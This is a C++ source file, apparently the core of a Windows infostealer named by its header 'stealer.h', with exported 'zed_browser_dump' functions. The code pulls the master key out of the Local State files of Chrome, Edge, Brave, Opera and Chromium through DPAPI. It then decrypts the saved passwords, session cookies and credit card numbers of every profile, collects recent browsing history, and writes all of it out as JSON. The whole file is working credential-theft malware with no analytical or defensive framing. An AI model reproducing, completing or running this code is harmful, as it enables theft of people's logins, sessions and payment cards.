#include "stealer.h"
#include "sqlite3.h"
#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <cstring>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

namespace fs = std::filesystem;

// ── Utilities ─────────────────────────────────────────────────────────────────

static std::string get_localappdata() {
    char path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path);
    return path;
}

static std::string escape_json(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 8);
    for (unsigned char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (c < 0x20) { char hex[8]; snprintf(hex, sizeof(hex), "\\u%04x", c); out += hex; }
                else out += (char)c;
        }
    }
    return out;
}

// Base64 decode (no padding needed as-is from Chrome's Local State)
static std::vector<BYTE> base64_decode(const std::string& in) {
    const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<BYTE> out;
    int val = 0, bits = -8;
    for (unsigned char c : in) {
        if (c == '=') break;
        auto pos = chars.find(c);
        if (pos == std::string::npos) continue;
        val = (val << 6) + (int)pos;
        bits += 6;
        if (bits >= 0) {
            out.push_back((BYTE)((val >> bits) & 0xFF));
            bits -= 8;
        }
    }
    return out;
}

// Parse a JSON string value for a given key (simple, no full JSON parser needed)
static std::string json_extract_string(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\":\"";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";
    pos += search.size();
    size_t end = pos;
    while (end < json.size() && json[end] != '"') {
        if (json[end] == '\\') end++; // skip escaped char
        end++;
    }
    return json.substr(pos, end - pos);
}

// ── DPAPI Master Key Extraction ───────────────────────────────────────────────

// Reads the encrypted_key from Local State and returns the master AES key
static std::vector<BYTE> get_master_key(const std::string& user_data_path) {
    std::string local_state_path = user_data_path + "\\Local State";
    std::ifstream f(local_state_path);
    if (!f.is_open()) return {};

    std::string json((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());

    // Find encrypted_key
    std::string enc_key_b64 = json_extract_string(json, "encrypted_key");
    if (enc_key_b64.empty()) return {};

    // Handle JSON escape sequences (in case it's stored escaped)
    // The actual key is after "DPAPI" prefix in the decoded bytes
    auto encrypted = base64_decode(enc_key_b64);

    // Remove "DPAPI" prefix (5 bytes)
    if (encrypted.size() <= 5) return {};
    DATA_BLOB in_blob  = { (DWORD)(encrypted.size() - 5), encrypted.data() + 5 };
    DATA_BLOB out_blob = {};

    if (!CryptUnprotectData(&in_blob, nullptr, nullptr, nullptr, nullptr, 0, &out_blob))
        return {};

    std::vector<BYTE> key(out_blob.pbData, out_blob.pbData + out_blob.cbData);
    LocalFree(out_blob.pbData);
    return key;  // 32-byte AES-256 key
}

// ── AES-256-GCM Decryption via Windows CNG ───────────────────────────────────

// Chromium encrypted blob format: "v10" + 12-byte nonce + ciphertext + 16-byte tag
static std::string aes_gcm_decrypt(const std::vector<BYTE>& key,
                                    const std::vector<BYTE>& encrypted_value)
{
    if (encrypted_value.size() < 3 + 12 + 16) return "";
    // Check "v10" or "v11" prefix
    if (encrypted_value[0] != 'v' || encrypted_value[1] < '1') return "";

    const BYTE* nonce      = encrypted_value.data() + 3;
    const BYTE* ciphertext = encrypted_value.data() + 3 + 12;
    size_t      cipher_len = encrypted_value.size() - 3 - 12 - 16;
    const BYTE* tag        = encrypted_value.data() + encrypted_value.size() - 16;

    BCRYPT_ALG_HANDLE  hAlg  = nullptr;
    BCRYPT_KEY_HANDLE  hKey  = nullptr;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) return "";

    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                      (ULONG)((wcslen(BCRYPT_CHAIN_MODE_GCM) + 1) * sizeof(wchar_t)), 0);

    BCRYPT_KEY_DATA_BLOB_HEADER kdbh = {};
    kdbh.dwMagic   = BCRYPT_KEY_DATA_BLOB_MAGIC;
    kdbh.dwVersion = BCRYPT_KEY_DATA_BLOB_VERSION1;
    kdbh.cbKeyData = (ULONG)key.size();

    std::vector<BYTE> kblob(sizeof(kdbh) + key.size());
    memcpy(kblob.data(), &kdbh, sizeof(kdbh));
    memcpy(kblob.data() + sizeof(kdbh), key.data(), key.size());

    status = BCryptImportKey(hAlg, nullptr, BCRYPT_KEY_DATA_BLOB,
                             &hKey, nullptr, 0, kblob.data(), (ULONG)kblob.size(), 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info;
    BCRYPT_INIT_AUTH_MODE_INFO(auth_info);
    auth_info.pbNonce      = (PUCHAR)nonce;
    auth_info.cbNonce      = 12;
    auth_info.pbTag        = (PUCHAR)tag;
    auth_info.cbTag        = 16;

    std::vector<BYTE> plaintext(cipher_len);
    ULONG result_len = 0;
    status = BCryptDecrypt(hKey, (PUCHAR)ciphertext, (ULONG)cipher_len,
                           &auth_info, nullptr, 0,
                           plaintext.data(), (ULONG)plaintext.size(), &result_len, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(status)) return "";
    return std::string(plaintext.begin(), plaintext.begin() + result_len);
}

// DPAPI fallback for older Chromium passwords (pre-v80)
static std::string dpapi_decrypt(const std::vector<BYTE>& data) {
    DATA_BLOB in_blob  = { (DWORD)data.size(), (BYTE*)data.data() };
    DATA_BLOB out_blob = {};
    if (!CryptUnprotectData(&in_blob, nullptr, nullptr, nullptr, nullptr, 0, &out_blob))
        return "";
    std::string result((char*)out_blob.pbData, out_blob.cbData);
    LocalFree(out_blob.pbData);
    return result;
}

// ── Browser Profile List ──────────────────────────────────────────────────────

struct BrowserProfile {
    std::string name;
    std::string user_data_path;
};

static std::vector<BrowserProfile> get_chromium_profiles() {
    std::string local = get_localappdata();
    return {
        {"Chrome",   local + "\\Google\\Chrome\\User Data"},
        {"Edge",     local + "\\Microsoft\\Edge\\User Data"},
        {"Brave",    local + "\\BraveSoftware\\Brave-Browser\\User Data"},
        {"Opera",    local + "\\Opera Software\\Opera Stable"},
        {"Chromium", local + "\\Chromium\\User Data"},
    };
}

static bool browser_matches(const std::string& filter, const std::string& name) {
    if (!filter.empty() && filter != "all") {
        std::string f = filter, n = name;
        std::transform(f.begin(), f.end(), f.begin(), ::tolower);
        std::transform(n.begin(), n.end(), n.begin(), ::tolower);
        return f == n;
    }
    return true;
}

// Copy a locked SQLite DB to temp so we can open it
static std::string copy_db_to_temp(const std::string& src) {
    char tmp_dir[MAX_PATH];
    GetTempPathA(sizeof(tmp_dir), tmp_dir);
    char tmp_file[MAX_PATH];
    GetTempFileNameA(tmp_dir, "zdb", 0, tmp_file);
    CopyFileA(src.c_str(), tmp_file, FALSE);
    return std::string(tmp_file);
}

// ── Passwords ─────────────────────────────────────────────────────────────────

extern "C" int zed_browser_dump_passwords(const char* browser, char* out_json, int buf_size) {
    auto profiles = get_chromium_profiles();
    std::ostringstream json;
    json << "[";
    int total = 0;

    for (auto& p : profiles) {
        if (!browser_matches(browser ? browser : "all", p.name)) continue;
        if (!fs::exists(p.user_data_path)) continue;

        auto master_key = get_master_key(p.user_data_path);

        // Iterate Default + Profile N
        std::vector<std::string> sub_dirs = {"Default"};
        for (int i = 1; i <= 10; i++)
            sub_dirs.push_back("Profile " + std::to_string(i));

        for (auto& sub : sub_dirs) {
            std::string db_path = p.user_data_path + "\\" + sub + "\\Login Data";
            if (!fs::exists(db_path)) continue;

            std::string tmp = copy_db_to_temp(db_path);
            sqlite3* db = nullptr;
            if (sqlite3_open(tmp.c_str(), &db) != SQLITE_OK) {
                DeleteFileA(tmp.c_str());
                continue;
            }

            sqlite3_stmt* stmt = nullptr;
            const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
            if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    const char* url  = (const char*)sqlite3_column_text(stmt, 0);
                    const char* user = (const char*)sqlite3_column_text(stmt, 1);
                    const void* blob = sqlite3_column_blob(stmt, 2);
                    int blob_size    = sqlite3_column_bytes(stmt, 2);

                    if (!url || !user || !blob || blob_size == 0) continue;

                    std::vector<BYTE> enc_pass((const BYTE*)blob, (const BYTE*)blob + blob_size);
                    std::string decrypted;

                    if (!master_key.empty() && blob_size > 3 &&
                        enc_pass[0] == 'v' && enc_pass[1] >= '1') {
                        decrypted = aes_gcm_decrypt(master_key, enc_pass);
                    } else {
                        decrypted = dpapi_decrypt(enc_pass);
                    }

                    if (decrypted.empty()) continue;

                    if (total > 0) json << ",";
                    json << "{\"browser\":\"" << escape_json(p.name) << "\","
                         << "\"profile\":\"" << escape_json(sub) << "\","
                         << "\"url\":\""  << escape_json(url)  << "\","
                         << "\"user\":\"" << escape_json(user) << "\","
                         << "\"pass\":\"" << escape_json(decrypted) << "\"}";
                    total++;
                }
                sqlite3_finalize(stmt);
            }
            sqlite3_close(db);
            DeleteFileA(tmp.c_str());
        }
    }

    json << "]";
    std::string result = json.str();
    int copy_len = ((int)result.size() < buf_size - 1) ? (int)result.size() : buf_size - 1;
    memcpy(out_json, result.c_str(), copy_len);
    out_json[copy_len] = '\0';
    return total;
}

// ── Cookies ───────────────────────────────────────────────────────────────────

extern "C" int zed_browser_dump_cookies(const char* browser, char* out_json, int buf_size) {
    auto profiles = get_chromium_profiles();
    std::ostringstream json;
    json << "[";
    int total = 0;

    for (auto& p : profiles) {
        if (!browser_matches(browser ? browser : "all", p.name)) continue;
        if (!fs::exists(p.user_data_path)) continue;

        auto master_key = get_master_key(p.user_data_path);

        std::vector<std::string> sub_dirs = {"Default"};
        for (int i = 1; i <= 10; i++)
            sub_dirs.push_back("Profile " + std::to_string(i));

        for (auto& sub : sub_dirs) {
            // Newer Chrome: Network/Cookies, older: Cookies
            std::string db_path = p.user_data_path + "\\" + sub + "\\Network\\Cookies";
            if (!fs::exists(db_path))
                db_path = p.user_data_path + "\\" + sub + "\\Cookies";
            if (!fs::exists(db_path)) continue;

            std::string tmp = copy_db_to_temp(db_path);
            sqlite3* db = nullptr;
            if (sqlite3_open(tmp.c_str(), &db) != SQLITE_OK) {
                DeleteFileA(tmp.c_str());
                continue;
            }

            sqlite3_stmt* stmt = nullptr;
            const char* sql = "SELECT host_key, name, encrypted_value FROM cookies LIMIT 2000";
            if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    const char* host = (const char*)sqlite3_column_text(stmt, 0);
                    const char* name = (const char*)sqlite3_column_text(stmt, 1);
                    const void* blob = sqlite3_column_blob(stmt, 2);
                    int blob_size    = sqlite3_column_bytes(stmt, 2);

                    if (!host || !name || !blob || blob_size == 0) continue;

                    std::vector<BYTE> enc_val((const BYTE*)blob, (const BYTE*)blob + blob_size);
                    std::string value;

                    if (!master_key.empty() && blob_size > 3 &&
                        enc_val[0] == 'v' && enc_val[1] >= '1') {
                        value = aes_gcm_decrypt(master_key, enc_val);
                    } else {
                        value = dpapi_decrypt(enc_val);
                    }

                    if (value.empty()) continue;

                    if (total > 0) json << ",";
                    json << "{\"browser\":\"" << escape_json(p.name) << "\","
                         << "\"host\":\""  << escape_json(host)  << "\","
                         << "\"name\":\""  << escape_json(name)  << "\","
                         << "\"value\":\"" << escape_json(value) << "\"}";
                    total++;
                }
                sqlite3_finalize(stmt);
            }
            sqlite3_close(db);
            DeleteFileA(tmp.c_str());
        }
    }

    json << "]";
    std::string result = json.str();
    int copy_len = ((int)result.size() < buf_size - 1) ? (int)result.size() : buf_size - 1;
    memcpy(out_json, result.c_str(), copy_len);
    out_json[copy_len] = '\0';
    return total;
}

// ── Credit Cards ──────────────────────────────────────────────────────────────

extern "C" int zed_browser_dump_cards(const char* browser, char* out_json, int buf_size) {
    auto profiles = get_chromium_profiles();
    std::ostringstream json;
    json << "[";
    int total = 0;

    for (auto& p : profiles) {
        if (!browser_matches(browser ? browser : "all", p.name)) continue;
        if (!fs::exists(p.user_data_path)) continue;

        auto master_key = get_master_key(p.user_data_path);

        std::vector<std::string> sub_dirs = {"Default"};
        for (int i = 1; i <= 5; i++)
            sub_dirs.push_back("Profile " + std::to_string(i));

        for (auto& sub : sub_dirs) {
            std::string db_path = p.user_data_path + "\\" + sub + "\\Web Data";
            if (!fs::exists(db_path)) continue;

            std::string tmp = copy_db_to_temp(db_path);
            sqlite3* db = nullptr;
            if (sqlite3_open(tmp.c_str(), &db) != SQLITE_OK) {
                DeleteFileA(tmp.c_str());
                continue;
            }

            sqlite3_stmt* stmt = nullptr;
            const char* sql = "SELECT name_on_card, expiration_month, expiration_year, "
                              "card_number_encrypted FROM credit_cards";
            if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    const char* name  = (const char*)sqlite3_column_text(stmt, 0);
                    int exp_m         = sqlite3_column_int(stmt, 1);
                    int exp_y         = sqlite3_column_int(stmt, 2);
                    const void* blob  = sqlite3_column_blob(stmt, 3);
                    int blob_size     = sqlite3_column_bytes(stmt, 3);

                    if (!name || !blob || blob_size == 0) continue;

                    std::vector<BYTE> enc_num((const BYTE*)blob, (const BYTE*)blob + blob_size);
                    std::string card_number;

                    if (!master_key.empty() && blob_size > 3 &&
                        enc_num[0] == 'v' && enc_num[1] >= '1') {
                        card_number = aes_gcm_decrypt(master_key, enc_num);
                    } else {
                        card_number = dpapi_decrypt(enc_num);
                    }

                    if (total > 0) json << ",";
                    json << "{\"browser\":\"" << escape_json(p.name) << "\","
                         << "\"name\":\""   << escape_json(name)        << "\","
                         << "\"number\":\"" << escape_json(card_number) << "\","
                         << "\"exp\":\""    << exp_m << "/" << exp_y   << "\"}";
                    total++;
                }
                sqlite3_finalize(stmt);
            }
            sqlite3_close(db);
            DeleteFileA(tmp.c_str());
        }
    }

    json << "]";
    std::string result = json.str();
    int copy_len = ((int)result.size() < buf_size - 1) ? (int)result.size() : buf_size - 1;
    memcpy(out_json, result.c_str(), copy_len);
    out_json[copy_len] = '\0';
    return total;
}

// ── History ───────────────────────────────────────────────────────────────────

extern "C" int zed_browser_dump_history(const char* browser, char* out_json, int buf_size) {
    auto profiles = get_chromium_profiles();
    std::ostringstream json;
    json << "[";
    int total = 0;

    for (auto& p : profiles) {
        if (!browser_matches(browser ? browser : "all", p.name)) continue;
        if (!fs::exists(p.user_data_path)) continue;

        std::vector<std::string> sub_dirs = {"Default"};
        for (int i = 1; i <= 5; i++)
            sub_dirs.push_back("Profile " + std::to_string(i));

        for (auto& sub : sub_dirs) {
            std::string db_path = p.user_data_path + "\\" + sub + "\\History";
            if (!fs::exists(db_path)) continue;

            std::string tmp = copy_db_to_temp(db_path);
            sqlite3* db = nullptr;
            if (sqlite3_open(tmp.c_str(), &db) != SQLITE_OK) {
                DeleteFileA(tmp.c_str());
                continue;
            }

            sqlite3_stmt* stmt = nullptr;
            const char* sql = "SELECT url, title, visit_count FROM urls "
                              "ORDER BY last_visit_time DESC LIMIT 500";
            if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    const char* url   = (const char*)sqlite3_column_text(stmt, 0);
                    const char* title = (const char*)sqlite3_column_text(stmt, 1);
                    int visits        = sqlite3_column_int(stmt, 2);

                    if (!url) continue;
                    if (total > 0) json << ",";
                    json << "{\"browser\":\"" << escape_json(p.name) << "\","
                         << "\"url\":\""   << escape_json(url ? url : "")   << "\","
                         << "\"title\":\"" << escape_json(title ? title : "") << "\","
                         << "\"visits\":"  << visits << "}";
                    total++;
                }
                sqlite3_finalize(stmt);
            }
            sqlite3_close(db);
            DeleteFileA(tmp.c_str());
        }
    }

    json << "]";
    std::string result = json.str();
    int copy_len = ((int)result.size() < buf_size - 1) ? (int)result.size() : buf_size - 1;
    memcpy(out_json, result.c_str(), copy_len);
    out_json[copy_len] = '\0';
    return total;
}
